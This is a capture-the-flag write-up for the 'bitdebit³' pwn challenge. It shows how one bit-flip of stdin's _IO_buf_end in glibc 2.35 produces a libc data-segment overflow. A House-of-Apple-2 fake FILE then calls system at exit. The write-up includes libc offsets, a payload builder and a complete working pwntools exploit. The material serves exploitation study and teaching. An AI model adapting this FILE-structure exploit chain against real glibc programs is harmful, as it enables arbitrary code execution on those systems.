# bitdebit³

`bitdebit³` is a 500-point pwn challenge from TFC CTF 2026. The binary gives you a
libc leak and a single arbitrary bit-flip (XOR one bit into one byte anywhere in
memory), then performs one `fgets`. Key idea: flip one bit of `stdin->_IO_buf_end`
to turn the next unbuffered read into a 0x4001-byte over-read that overwrites
libc's FILE structures, then use a House-of-Apple-2 style fake FILE (wide-vtable
`__doallocate = system`) to run `system(" cat flag")` at exit.

## Recon

The attachment is `bitdebit3.zip`. Unpacking gives `bitdebit³`, `libc.so.6`,
`ld-2.35.so`, a `Dockerfile` and a local `flag`. The Dockerfile copies
`bitdebit³_patched`, `libc.so.6`, `ld-2.35.so` and `flag` into `/home/pwn` and
runs the binary under `socat` on port 1337 (flag path `/home/pwn/flag`).

```
$ file bitdebit³
bitdebit³: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=48c49c2de1e1f745bc3aa71b4746d85dcb107941, with debug_info, not stripped

$ checksec bitdebit³
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
Debuginfo:  Yes
```

```
$ strings bitdebit³ | grep -E "addr|bit|name|traveler|libc|puts"
libc base: %p
puts@libc: %p
I'm feeling generous today, have 1³ bits. Thank me later.
first addr
first bit
What was your name? I didnt get it
See you around traveler
```

Running it locally shows the exact protocol:

```
$ ./bitdebit³
libc base: 0x7e0a46000000
puts@libc: 0x7e0a46087cc0
I'm feeling generous today, have 1³ bits. Thank me later.
first addr
first bit
```

Program flow (the binary is not stripped and has debug symbols):

1. `leak_libc_base()` prints `libc base: %p` and `puts@libc: %p` (resolved via `dladdr`).
2. It reads a `first addr` (u64) and a `first bit` (0-7), then XORs `1<<bit` into
   the byte at `addr` — one single-bit write anywhere in the address space.
3. It calls `fgets(name, 0x100, stdin)`, then `puts(name)`, then `exit()`.

`setup()` calls `setvbuf(stdin/stdout/stderr, NULL, _IONBF, 0)`. With `_IONBF`,
stdin is unbuffered: `_IO_buf_base` points at the FILE's embedded `shortbuf` and
`_IO_buf_end = shortbuf + 1`.

## Analysis

Observation: with `_IONBF` and an empty buffer, every `fgets` on stdin goes to
`_IO_file_underflow`, which issues `read(0, _IO_buf_base, _IO_buf_end - _IO_buf_base)`.
The size is the difference between `_IO_buf_end` and `_IO_buf_base` — normally 1 byte.

Hypothesis: if I flip one bit in `_IO_buf_end` so its value grows by `0x4000`,
the next `fgets` will read `0x4001` bytes into `shortbuf` (which sits inside the
libc data segment right after the stdin FILE struct). That single big read
overwrites the tail of the real `stdin` FILE, then `_IO_wide_data_0`, `main_arena`,
and everything up to (and beyond) `_IO_list_all` — enough room to forge a
complete fake FILE chain.

Confirmation: `shortbuf = stdin + 0x83` and `_IO_list_all` is only `0xb65` bytes
away, so the 0x4001-byte read comfortably reaches it; the whole overflow is
delivered in one `read()`, so the fake structures land in libc memory before
`fgets` returns.

Techniques:

- **Single-bit write primitive** — the one controlled memory corruption.
- **FILE-struct underflow over-read** — enlarging `_IO_buf_end` makes the
  unbuffered underflow read attacker-controlled bytes into the libc data segment.
- **House of Apple 2** — a fake FILE whose vtable is `_IO_wfile_jumps` and whose
  `_wide_data` points to a fake wide-vtable with `__doallocate = system`. The wide
  vtable pointer is *not* checked by `IO_validate_vtable`, which is what bypasses
  the usual vtable pointer validation.

The exit path is:

```
exit -> _IO_cleanup -> _IO_flush_all_lockp(0)
     -> _IO_OVERFLOW(fp)                (vtable = _IO_wfile_jumps)
     -> _IO_wfile_overflow
     -> _IO_wdoallocbuf
     -> wide_vtable->__doallocate(fp)   (unvalidated = system)
     -> system(" cat flag")
```

The command string `" cat flag"` lives at offset 0 of the fake FILE; the leading
space keeps `_flags` low bits (`_IO_UNBUFFERED=0x2`, `_IO_NO_WRITES=0x8`,
`_IO_CURRENTLY_PUTTING=0x800`) clear so the overflow path is taken, and the
relative `flag` path resolves to `/home/pwn/flag` (the process cwd).

## Exploit

Offsets in the provided `libc.so.6` (glibc 2.35), relative to the leaked base:

```
STDIN           0x21aaa0   # _IO_2_1_stdin_
SHORTBUF        0x21aaa0 + 0x83
IO_BUF_END      0x21aaa0 + 0x40
IO_LIST_ALL     0x21b680
SYSTEM          0x50d70
IO_WFILE_JUMPS  0x2170c0
STDIN_LOCK      0x21ca80
FAKE_FILE       0x21ad00
FAKE_WD         0x21ae00
FAKE_WVT        0x21af00
```

**1. Get the leak.**

Connect over TLS netcat and parse the `libc base: 0x...` line.

```
$ ncat --ssl <deployment>.challs.ctf.thefewchosen.com 1337
libc base: 0x7f3d12a00000
puts@libc: 0x7f3d12a87cc0
I'm feeling generous today, have 1³ bits. Thank me later.
first addr
```

The `puts@libc` line is not needed; the exploit keys only on `libc base`.

**2. Flip bit 6 of the second byte of `_IO_buf_end`.**

`_IO_buf_end` starts as `shortbuf + 1 = 0x21ab24`. The second byte is `0xab`
(`1010 1011`); flipping bit 6 turns it into `0xeb` (`1110 1011`), i.e. `+0x4000`:

```
addr = base + IO_BUF_END + 1   # base + 0x21aae1
bit  = 6
# byte 0xab ^ (1<<6) = 0xeb  ->  _IO_buf_end = 0x21eb24
# read length = 0x21eb24 - 0x21ab23 = 0x4001
```

**3. Build the 0xb65-byte FSOP payload.**

The payload is written by the big read starting at `shortbuf`, so every `put`
is addressed as an offset from `base + SHORTBUF`. It repairs the two clobbered
fields of the real stdin (`_lock` -> `STDIN_LOCK`, `_offset` -> -1), forges a
fake FILE + fake `_IO_wide_data` + fake wide vtable, and overwrites `_IO_list_all`.

```python
def build_payload(base):
    payload_len = (IO_LIST_ALL + 8) - SHORTBUF          # 0xb65
    payload = bytearray(payload_len)
    def put(addr, data):
        off = addr - (base + SHORTBUF)
        payload[off:off+len(data)] = data

    # repair tail of the real stdin FILE (clobbered by the overflow)
    put(base + STDIN + 0x88, p64(base + STDIN_LOCK))    # _lock
    put(base + STDIN + 0x90, p64(0xffffffffffffffff))   # _offset

    # fake FILE at base+0x21ad00
    f = base + FAKE_FILE
    put(f + 0x00, b" cat flag\x00")   # _flags + read/write ptrs (cmd string)
    put(f + 0x20, p64(0))              # _IO_write_base = 0
    put(f + 0x28, p64(1))              # _IO_write_ptr  = 1
    put(f + 0x68, p64(0))              # _chain = 0 (stop the flush walk)
    put(f + 0xa0, p64(base + FAKE_WD)) # _wide_data = fake wide data
    put(f + 0xc0, p64(0))              # _mode = 0
    put(f + 0xd8, p64(base + IO_WFILE_JUMPS))  # vtable = _IO_wfile_jumps

    # fake _IO_wide_data at base+0x21ae00
    w = base + FAKE_WD
    put(w + 0x18, p64(0))              # _IO_write_base = 0
    put(w + 0x30, p64(0))              # _IO_buf_base   = 0
    put(w + 0xe0, p64(base + FAKE_WVT))# _wide_vtable = fake wide vtable

    # fake wide vtable at base+0x21af00
    v = base + FAKE_WVT
    put(v + 0x68, p64(base + SYSTEM))  # __doallocate = system

    put(base + IO_LIST_ALL, p64(base + FAKE_FILE))  # head of flush list
    return bytes(payload)
```

**4. Send everything in ONE `send()`.**

The program reads `addr` and `bit` as lines, then `fgets` triggers the big read.
The whole payload must already be buffered in the socket before that read, or the
underflow `read()` returns a truncated payload (remote prints only
`See you around traveler` and no flag).

```python
io.send(str(addr).encode() + b"\n" +
        str(bit).encode()  + b"\n" +
        payload)
```

**5. Trigger the chain and read the flag.**

`fgets` returns, `puts(name)` echoes the name, and `exit()` walks `_IO_list_all`,
hits the fake FILE, and calls `system(" cat flag")`:

```
$ ncat --ssl <deployment>.challs.ctf.thefewchosen.com 1337
libc base: 0x7f3d12a00000
puts@libc: 0x7f3d12a87cc0
I'm feeling generous today, have 1³ bits. Thank me later.
first addr
first bit
What was your name? I didnt get it
See you around traveler
TFCCTF{this_is_probably_getting_solved_by_AI_but_so_be_it_i_thought_it_was_cool}
```

## Full chain

```python
import re, sys
from pwn import *
context.log_level = "error"

STDIN        = 0x21aaa0
SHORTBUF     = STDIN + 0x83
IO_BUF_END   = STDIN + 0x40
IO_LIST_ALL  = 0x21b680
SYSTEM       = 0x50d70
IO_WFILE_JUMPS = 0x2170c0
STDIN_LOCK   = 0x21ca80
FAKE_FILE    = 0x21ad00
FAKE_WD      = 0x21ae00
FAKE_WVT     = 0x21af00

def build_payload(base):
    payload_len = (IO_LIST_ALL + 8) - SHORTBUF
    payload = bytearray(payload_len)
    def put(addr, data):
        off = addr - (base + SHORTBUF)
        payload[off:off+len(data)] = data
    put(base + STDIN + 0x88, p64(base + STDIN_LOCK))
    put(base + STDIN + 0x90, p64(0xffffffffffffffff))
    f = base + FAKE_FILE
    put(f + 0x00, b" cat flag\x00")
    put(f + 0x20, p64(0))
    put(f + 0x28, p64(1))
    put(f + 0x68, p64(0))
    put(f + 0xa0, p64(base + FAKE_WD))
    put(f + 0xc0, p64(0))
    put(f + 0xd8, p64(base + IO_WFILE_JUMPS))
    w = base + FAKE_WD
    put(w + 0x18, p64(0))
    put(w + 0x30, p64(0))
    put(w + 0xe0, p64(base + FAKE_WVT))
    v = base + FAKE_WVT
    put(v + 0x68, p64(base + SYSTEM))
    put(base + IO_LIST_ALL, p64(base + FAKE_FILE))
    return bytes(payload)

def exploit(host, port=1337):
    io = remote(host, port, ssl=True, sni=host)
    out = io.recvuntil(b"first addr\n", timeout=15)
    m = re.search(rb"libc base: (0x[0-9a-f]+)", out)
    base = int(m.group(1), 16)
    addr = base + IO_BUF_END + 1
    bit = 6
    payload = build_payload(base)
    io.send(str(addr).encode() + b"\n" +
            str(bit).encode()  + b"\n" +
            payload)
    return io.recvall(timeout=5)

print(exploit(sys.argv[1]))
```

## Flag

`TFCCTF{this_is_probably_getting_solved_by_AI_but_so_be_it_i_thought_it_was_cool}`

## Lessons

- A one-bit write is enough for a full FILE-struct exploit: grow `_IO_buf_end` by
  one power of two and the next unbuffered underflow becomes an attacker-sized read
  into the libc data segment.
- The wide-vtable pointer (`_wide_data->_wide_vtable`) is not validated by
  `IO_validate_vtable`; pointing it at a fake vtable with `__doallocate = system`
  is the House-of-Apple-2 bypass when the primary vtable is checked.
- For socket read races, send every stage of the payload in a single `send()`
  before the target's `read()` blocks, or the underflow returns a truncated buffer.
